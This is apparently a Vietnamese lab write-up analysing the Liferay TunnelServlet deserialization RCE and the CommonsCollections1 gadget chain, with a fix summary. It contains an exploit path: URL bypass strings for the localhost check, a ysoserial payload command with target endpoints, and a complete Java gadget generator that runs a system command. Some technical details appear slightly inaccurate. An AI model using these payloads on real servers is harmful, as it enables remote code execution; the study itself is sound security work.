# 🔍 Phân Tích Lỗ Hổng Liferay TunnelServlet Deserialization RCE & Gadget CommonsCollections1

## 📌 Mục tiêu
- Phân tích chi tiết lỗ hổng `unsafe deserialization` trên Liferay thông qua endpoint `/api/liferay` và `/api/spring`.
- Tìm hiểu cách hoạt động của gadget `CommonsCollections1` khi bị deserialized.
- Viết PoC khai thác lỗ hổng và tự tạo gadget để thực thi mã từ xa.

---

## 🧪 PHẦN 1: Phân Tích Lỗ Hổng Unsafe Deserialization Trên Liferay

### 1.1 Dựng môi trường test
- Tải và cài đặt **Liferay Portal 6.2 CE GA1** (hoặc phiên bản bị ảnh hưởng cụ thể được ghi nhận trong CVE).
- Môi trường:
  - Hệ điều hành: Ubuntu/Debian hoặc Windows đều được.
  - Java 7/8 (tùy phiên bản Liferay yêu cầu).
  - Tomcat (đi kèm với bản cài đặt Liferay).

### 1.2 Cài đặt môi trường debug
- IDE: **IntelliJ IDEA** hoặc **Eclipse**
- Import mã nguồn Liferay (có thể dùng mã nguồn từ GitHub hoặc build lại từ Liferay SDK).
- Cấu hình remote debugger:
  ```bash
  JAVA_OPTS="$JAVA_OPTS -agentlib:jdwp=transport=dt_socket,address=8000,server=y,suspend=n"
  ```
  Sau đó kết nối debugger từ IDE để phân tích luồng xử lý yêu cầu `/api/*`.

### 1.3 Đọc mô tả lỗi và debug
- Mô tả lỗi: https://www.acunetix.com/vulnerabilities/web/liferay-tunnelservlet-deserialization-remote-code-execution/
- Endpoint `/api/jsonws/invoke` (TunnelServlet) thực hiện deserialize dữ liệu đầu vào (`ObjectInputStream`) mà không kiểm tra lớp đối tượng.
- Debug vào các class như:
  - `com.liferay.portal.servlet.TunnelServlet`
  - `com.liferay.portal.security.auth.HttpAuthManagerImpl`
  - `ObjectInputStream` xử lý đầu vào từ request body.

### 1.4 Bypass Localhost Restriction
- Các endpoint `/api/liferay` và `/api/spring` mặc định chỉ cho phép từ `localhost`.
- Một số phiên bản cũ có thể bị bypass bằng chuỗi như:
  ```
  /api////liferay
  /api///spring
  ```
- Phân tích: Filter URL normalization (`getRequestURI()`) không xử lý chính xác các dấu `/` hoặc `;`, dẫn đến kiểm tra IP bị bỏ qua. Debug để theo dõi `request.getRemoteAddr()` và `request.getRequestURI()`.

### 1.5 Viết mã khai thác (Exploit)
- Sử dụng **ysoserial** để tạo gadget payload với `CommonsCollections1`:
  ```bash
  java -jar ysoserial.jar CommonsCollections1 "touch /tmp/pwned" > payload.ser
  ```
- Dùng Python hoặc curl để gửi request POST đến:
  ```
  http://target:8080/api/liferay
  http://target:8080/api////spring
  ```
- Header cần có:
  ```
  Content-Type: application/x-java-serialized-object
  ```
- Debug để xác nhận lệnh đã được thực thi.

### 1.6 Liferay đã fix như thế nào?
- Chặn các chuỗi `/api/*` từ IP ngoài `localhost`.
- Kiểm tra lại đường dẫn thực tế sau chuẩn hóa URI.
- Kiểm tra loại object được deserialize bằng allowlist.
- Tắt hoàn toàn TunnelServlet trong cấu hình nếu không sử dụng.

---

## 🔬 PHẦN 2: Phân Tích Gadget CommonsCollections1

### 2.1 Dựng môi trường test
- Tạo project Maven:
  ```bash
  mvn archetype:generate -DgroupId=com.example -DartifactId=cc1-test -DarchetypeArtifactId=maven-archetype-quickstart
  ```
- Thêm dependency:
  ```xml
  <dependency>
    <groupId>commons-collections</groupId>
    <artifactId>commons-collections</artifactId>
    <version>3.1</version>
  </dependency>
  ```
- Viết chương trình đọc file `payload_cc1.bin` và deserialize:
  ```java
  ObjectInputStream in = new ObjectInputStream(new FileInputStream("payload_cc1.bin"));
  in.readObject();
  ```

### 2.2 Phân tích luồng thực thi gadget
- Gadget chain:
  ```
  AnnotationInvocationHandler
    -> LazyMap
      -> ChainedTransformer
        -> InvokerTransformer
  ```
- Quá trình:
  1. `AnnotationInvocationHandler` gọi `toString()`/`equals()` trên map.
  2. `LazyMap` gọi `transform()`.
  3. `ChainedTransformer` gọi nhiều `InvokerTransformer`.
  4. Thực thi lệnh hệ thống thông qua `Runtime.getRuntime().exec()`.

### 2.3 Tự viết lại class tạo gadget
- Viết lại class Java mô phỏng ysoserial:
  ```java
package com.example;  
  
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.map.LazyMap;  
  
import java.io.*;  
import java.lang.reflect.Constructor;  
import java.lang.reflect.InvocationHandler;  
import java.lang.reflect.InvocationTargetException;  
import java.lang.reflect.Proxy;  
import java.util.HashMap;  
import java.util.Map;  
  
public class CommonsCollections1 {  
    public static void main(String... args) throws ClassNotFoundException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException {  
        // Command  
        String[] execArgs = {"calc.exe"};  
  
        // Create a ChainTransformer to invoke that command.  
        final Transformer[] transformers = new Transformer[] {  
                new ConstantTransformer(Runtime.class),  
                new InvokerTransformer("getMethod", new Class[] {  
                        String.class, Class[].class }, new Object[] {  
                        "getRuntime", new Class[0] }),  
                new InvokerTransformer("invoke", new Class[] {  
                        Object.class, Object[].class }, new Object[] {  
                        null, new Object[0] }),  
                new InvokerTransformer("exec",  
                        new Class[] { String.class }, execArgs),  
                new ConstantTransformer(1) };  
  
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
  
        // Create a LazyMap  
        Map map = new HashMap<>();  
        Map lazyMap = LazyMap.decorate(map, chainedTransformer);  
  
        // Init a `sun.reflect.annotation.AnnotationInvocationHandler` object  
        Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  
        final Constructor<?> constructor = cls.getDeclaredConstructors()[0];  
        constructor.setAccessible(true);  
        InvocationHandler lazyMapInvocationHandler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);  
        Map evilProxy = (Map) Proxy.newProxyInstance(CommonsCollections1.class.getClassLoader(), new Class[]{Map.class}, lazyMapInvocationHandler);  
  
        InvocationHandler serializedProxyInvocationHandler = (InvocationHandler) constructor.newInstance(Override.class, evilProxy);  
  
        serialize(serializedProxyInvocationHandler);  
    }  
  
    public static void serialize(Object object) throws IOException {  
        FileOutputStream fileOut = new FileOutputStream("payload_cc1.bin");  
        ObjectOutputStream out = new ObjectOutputStream(fileOut);  
        out.writeObject(object);  
        out.close();  
        fileOut.close();  
    }  
}
  ```
- Test với chương trình deserialize ở bước 2.1 và kiểm tra kết quả.

---

## ✅ Kết luận
- Lỗ hổng `unsafe deserialization` cực kỳ nghiêm trọng nếu kết hợp với gadget nguy hiểm như `CommonsCollections1`.
- Liferay TunnelServlet là điểm tấn công rõ ràng nếu endpoint không được bảo vệ đúng cách.
- Việc phân tích và viết lại gadget giúp hiểu rõ nội tại lỗ hổng, tăng khả năng phòng thủ và phát hiện.

---

## 📚 Tài liệu tham khảo
- https://www.acunetix.com/vulnerabilities/web/liferay-tunnelservlet-deserialization-remote-code-execution/
- https://github.com/frohoff/ysoserial
- https://portswigger.net/web-security/deserialization
- https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data
